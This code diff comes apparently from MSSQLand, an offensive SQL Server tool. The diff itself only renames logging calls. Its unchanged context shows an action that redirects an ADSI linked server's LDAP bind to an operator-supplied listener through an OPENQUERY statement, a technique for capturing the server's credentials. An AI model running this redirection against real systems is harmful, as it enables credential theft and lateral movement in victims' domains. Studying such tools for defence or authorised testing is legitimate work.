@@ -44,7 +44,7 @@ namespace MSSQLand.Actions.Domain
 
         public override object Execute(DatabaseContext databaseContext)
         {
-            Logger.Task($"Redirecting ADSI LDAP bind to: {_listenerAddress}");
+            Logger.Info($"Redirecting ADSI LDAP bind to: {_listenerAddress}");
 
             AdsiService adsiService = new(databaseContext);
 
@@ -54,12 +54,12 @@ namespace MSSQLand.Actions.Domain
                 if (servers.Count == 0)
                 {
                     Logger.Error("No ADSI linked server found on the execution target.");
-                    Logger.TaskNested("List linked servers with: links");
+                    Logger.InfoNested("List linked servers with: links");
                     return null;
                 }
 
                 _targetServer = servers[0];
-                Logger.TaskNested($"Found existing ADSI linked server: '{_targetServer}'");
+                Logger.InfoNested($"Found existing ADSI linked server: '{_targetServer}'");
             }
             else if (!adsiService.AdsiServerExists(_targetServer))
             {
@@ -71,7 +71,7 @@ namespace MSSQLand.Actions.Domain
             string listenerAddr = _listenerAddress.Contains(":") ? _listenerAddress : $"{_listenerAddress}:389";
             string redirectQuery = $"SELECT * FROM OPENQUERY([{_targetServer}], 'SELECT * FROM ''LDAP://{listenerAddr}'' ')";
 
-            Logger.TaskNested($"Via '{_targetServer}' → {listenerAddr}");
+            Logger.InfoNested($"Via '{_targetServer}' → {listenerAddr}");
             try
             {
                 databaseContext.QueryService.ExecuteNonProcessing(redirectQuery);
